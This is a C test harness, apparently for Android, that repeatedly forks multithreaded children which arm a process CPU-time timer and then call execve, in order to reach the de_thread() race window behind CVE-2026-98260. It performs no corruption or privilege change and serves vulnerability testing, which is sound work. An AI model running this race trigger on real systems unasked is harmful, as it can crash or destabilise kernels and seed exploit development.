/*
 * CVE-2026-98260 (InfinityCore / "exec: Cleanup POSIX timers right after
 * de_thread()") reachability harness.
 *
 * Purpose: exercise the execve()+de_thread() path while a POSIX CPU-time
 * timer is pending, i.e. the exact window the fix closes. This is a
 * REACHABILITY probe, not an exploit: it performs no memory corruption
 * primitives, no privilege change, no partition access.
 *
 * Modes:
 *   --dry      mechanics only: run exec+threads WITHOUT an armed timer.
 *              Cannot enter the vulnerable window. Safe smoke test.
 *   (default)  arm CLOCK_PROCESS_CPUTIME_ID timer, then execve from a
 *              multithreaded child so de_thread() runs with a live timer.
 *
 * Exit status classification is done by the parent, which never execs.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>

static volatile int g_spin = 1;
static timer_t g_timer;

static void on_timer(int sig) {
    (void)sig; /* deliberately no work: we only care that it fires */
}

static void *burner(void *arg) {
    (void)arg;
    unsigned long x = 0;
    while (g_spin) {
        for (int i = 0; i < 4096; i++) x += i;
        __asm__ __volatile__("yield");
    }
    return (void *)x;
}

/* Child: multithreaded execve, optionally with a pending CPU timer. */
static void child_run(int dry, int nthreads, long delay_us) {
    pthread_t th[16];
    struct sigaction sa;
    struct sigevent sev;
    struct itimerspec its;
    char exe[64];

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = on_timer;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGALRM, &sa, NULL);

    for (int i = 0; i < nthreads && i < 16; i++)
        pthread_create(&th[i], NULL, burner, NULL);

    if (!dry) {
        memset(&sev, 0, sizeof(sev));
        sev.sigev_notify = SIGEV_SIGNAL;
        sev.sigev_signo = SIGALRM;
        if (timer_create(CLOCK_PROCESS_CPUTIME_ID, &sev, &g_timer) != 0) {
            fprintf(stderr, "timer_create: %s\n", strerror(errno));
            _exit(90);
        }
        /* Arm short so it is pending/expiring across de_thread(). */
        memset(&its, 0, sizeof(its));
        its.it_value.tv_nsec = 200000L; /* 200us of process CPU time */
        if (timer_settime(g_timer, 0, &its, NULL) != 0) {
            fprintf(stderr, "timer_settime: %s\n", strerror(errno));
            _exit(91);
        }
    }

    if (delay_us > 0) usleep((useconds_t)delay_us);

    /* de_thread() happens here because we are multithreaded. */
    snprintf(exe, sizeof(exe), "/system/bin/true");
    execve(exe, (char *const[]){ exe, NULL }, (char *const[]){ NULL });

    /* Only reached if execve failed. */
    fprintf(stderr, "execve: %s\n", strerror(errno));
    _exit(92);
}

int main(int argc, char **argv) {
    int dry = 0, iters = 20, nthreads = 3;
    long delay_us = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--dry")) dry = 1;
        else if (!strcmp(argv[i], "--iters") && i + 1 < argc) iters = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--threads") && i + 1 < argc) nthreads = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--delay-us") && i + 1 < argc) delay_us = atol(argv[++i]);
        else { fprintf(stderr, "unknown arg: %s\n", argv[i]); return 2; }
    }

    printf("[*] mode=%s iters=%d threads=%d delay_us=%ld uid=%d\n",
           dry ? "DRY(mechanics)" : "ARMED(timer+exec race)",
           iters, nthreads, delay_us, (int)getuid());
    fflush(stdout);

    int ok = 0, bad = 0;
    for (int i = 0; i < iters; i++) {
        pid_t pid = fork();
        if (pid == 0) child_run(dry, nthreads, delay_us);
        if (pid < 0) { perror("fork"); return 3; }

        int st = 0;
        if (waitpid(pid, &st, 0) < 0) { perror("waitpid"); return 4; }

        if (WIFEXITED(st) && WEXITSTATUS(st) == 0) {
            ok++;
        } else {
            bad++;
            if (WIFSIGNALED(st))
                printf("[!] iter %d killed by signal %d (%s)\n",
                       i, WTERMSIG(st), strsignal(WTERMSIG(st)));
            else
                printf("[!] iter %d exit=%d\n", i, WEXITSTATUS(st));
            fflush(stdout);
        }
    }

    printf("[*] done: clean=%d anomalous=%d\n", ok, bad);
    fflush(stdout);
    return bad ? 1 : 0;
}
